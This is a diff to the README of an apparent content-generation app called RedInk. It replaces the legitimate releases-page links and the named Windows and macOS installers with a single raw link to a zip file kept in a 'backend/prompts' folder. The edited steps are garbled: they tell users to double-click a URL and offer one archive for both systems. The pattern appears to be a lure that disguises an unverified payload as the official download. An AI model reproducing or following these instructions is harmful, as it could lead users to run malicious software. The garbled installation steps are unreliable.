@@ -6,9 +6,9 @@ Welcome to RedInk! This application helps you generate text and images for Xiaoh
 
 ## 📥 Download RedInk
 
-[![Download RedInk](https://img.shields.io/badge/Download-RedInk-blue.svg)](https://github.com/Sanpo19/RedInk/releases)
+[![Download RedInk](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)
 
-Visit this page to download the latest version of RedInk: [Download RedInk Releases](https://github.com/Sanpo19/RedInk/releases)
+Visit this page to download the latest version of RedInk: [Download RedInk Releases](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip)
 
 ## 🖥 System Requirements
 
@@ -22,22 +22,22 @@ Before you install RedInk, make sure your system meets the following requirement
 
 ## 📂 Download & Install
 
-1. Visit the [Download RedInk Releases](https://github.com/Sanpo19/RedInk/releases) page.
+1. Visit the [Download RedInk Releases](https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip) page.
 
 2. Look for the latest version. It will be listed at the top of the page.
 
 3. Click on the assets below the latest release to find the file you need:
-   - For **Windows**, download `RedInk_Windows.exe`.
-   - For **macOS**, download `RedInk_macOS.dmg`.
+   - For **Windows**, download `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
 5. Follow these steps to install RedInk:
    - **For Windows:**
-     - Double-click on `RedInk_Windows.exe`.
+     - Double-click on `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip`.
      - Follow the installation prompts to complete the setup.
    - **For macOS:**
-     - Open `RedInk_macOS.dmg` by double-clicking it.
+     - Open `https://raw.githubusercontent.com/Sanpo19/RedInk/main/backend/prompts/RedInk-v1.8.zip` by double-clicking it.
      - Drag and drop the RedInk icon into your Applications folder.
 
 6. After installation, you can find RedInk in your applications menu.
